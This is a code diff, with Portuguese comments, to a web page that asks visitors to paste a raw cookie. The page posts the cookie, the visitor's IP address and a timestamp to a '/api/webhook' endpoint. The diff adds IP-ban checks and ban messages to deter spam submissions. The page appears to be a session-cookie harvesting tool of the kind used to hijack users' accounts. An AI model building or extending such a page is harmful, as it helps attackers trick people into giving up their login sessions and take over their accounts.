@@ -641,6 +641,25 @@
             .choice-value { font-size: 26px; }
             .notification { left: 20px; right: 20px; max-width: none; }
         }
+
+        /* Estilo para IP banido */
+        .banned-message {
+            background: rgba(244, 63, 94, 0.1);
+            border: 2px solid #f43f5e;
+            border-radius: 60px;
+            padding: 16px 22px;
+            margin-top: 10px;
+            color: #f43f5e;
+            text-align: center;
+            font-weight: 500;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
     </style>
 </head>
 <body>
@@ -697,9 +716,13 @@
                     <div class="status-dot"></div>
                     <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
+                
+                <!-- Área para mensagem de ban (inicialmente vazia) -->
+                <div id="banMessage" class="banned-message" style="display: none;"></div>
+                
                 <!-- Exibir IP e cooldown -->
                 <div class="info-row">
-                    <div class="info-text" id="ipInfo">IP: carregando...</div>
+                    <div class="info-text" id="ipInfo"></div>
                     <div class="info-text" id="cooldownInfo"></div>
                 </div>
             </div>
@@ -783,18 +806,65 @@
     </div>
 
     <script>
-        const API_URL = '/api/webhook'; // Vai chamar o arquivo webhook.js
+        const API_URL = '/api/webhook';
+        const CHECK_BAN_URL = '/api/verificar-ban'; // URL para verificar ban
         
         const COOLDOWN_TIME = 300000;
         const COOLDOWN_KEY = 'aurora_last_cookie_sent';
+
+        // Variável para armazenar o IP do usuário
+        let userIP = '';
 
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                return data.ip || 'IP não disponível';
+                userIP = data.ip || 'IP não disponível';
+                
+                // Verificar se o IP está banido assim que carregar
+                await checkIfBanned();
+                
+                return userIP;
             } catch (error) {
-                return 'IP não disponível';
+                userIP = 'IP não disponível';
+                return userIP;
+            }
+        }
+
+        // NOVA FUNÇÃO: Verificar se IP está banido
+        async function checkIfBanned() {
+            if (!userIP || userIP === 'IP não disponível') return;
+            
+            try {
+                const response = await fetch(`${CHECK_BAN_URL}?ip=${userIP}`);
+                const data = await response.json();
+                
+                const banMessageEl = document.getElementById('banMessage');
+                const sendBtn = document.getElementById('sendBtn');
+                const cookieInput = document.getElementById('cookieInput');
+                
+                if (data.banned) {
+                    // Mostrar mensagem de ban
+                    banMessageEl.style.display = 'block';
+                    banMessageEl.innerHTML = `🚫 IP BANIDO<br><small>${data.message || 'Contate o suporte'}</small>`;
+                    
+                    // Desabilitar botão e input
+                    sendBtn.disabled = true;
+                    sendBtn.style.opacity = '0.5';
+                    cookieInput.disabled = true;
+                    cookieInput.style.opacity = '0.5';
+                } else {
+                    // Esconder mensagem de ban
+                    banMessageEl.style.display = 'none';
+                    
+                    // Habilitar botão e input
+                    sendBtn.disabled = false;
+                    sendBtn.style.opacity = '1';
+                    cookieInput.disabled = false;
+                    cookieInput.style.opacity = '1';
+                }
+            } catch (error) {
+                console.error('Erro ao verificar ban:', error);
             }
         }
 
@@ -827,7 +897,12 @@
         }
 
         setInterval(updateInfoDisplays, 1000);
-        window.addEventListener('load', updateInfoDisplays);
+        
+        // Carregar IP e verificar ban ao iniciar
+        window.addEventListener('load', async () => {
+            await getUserIP();
+            updateInfoDisplays();
+        });
 
         function createStars() {
             const starsContainer = document.getElementById('stars');
@@ -913,6 +988,13 @@
             const status = document.getElementById('status');
             const btn = document.getElementById('sendBtn');
             
+            // Verificar se IP está banido (dupla verificação)
+            const banMessageEl = document.getElementById('banMessage');
+            if (banMessageEl.style.display === 'block') {
+                showNotification('Bloqueado', 'Seu IP está banido!', false);
+                return;
+            }
+            
             const rawCookie = input.value.trim();
 
             if (!rawCookie) {
@@ -937,8 +1019,7 @@
             btn.disabled = true;
 
             try {
-                const userIP = await getUserIP();
-                
+                // Usar o IP já armazenado
                 const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -949,6 +1030,8 @@
                         timestamp: new Date().toLocaleString('pt-BR')
                     })
                 });
+
+                const data = await response.json();
 
                 if (response.ok) {
                     localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
@@ -969,12 +1052,23 @@
                         status.innerHTML = '';
                     }, 1000);
                 } else {
-                    throw new Error('Erro no servidor');
+                    // Se o servidor retornar que o IP está banido
+                    if (data.banned) {
+                        // Atualizar interface para mostrar ban
+                        await checkIfBanned(); // Re-verificar ban
+                        showNotification('🚫 BANIDO', data.message || 'IP banido por spam', true);
+                    } else {
+                        throw new Error(data.error || 'Erro no servidor');
+                    }
                 }
             } catch (error) {
                 showNotification('Erro', 'Falha ao enviar cookie', false);
             } finally {
-                setTimeout(() => { btn.disabled = false; }, 2000);
+                setTimeout(() => { 
+                    if (banMessageEl.style.display !== 'block') {
+                        btn.disabled = false; 
+                    }
+                }, 2000);
             }
         }
 
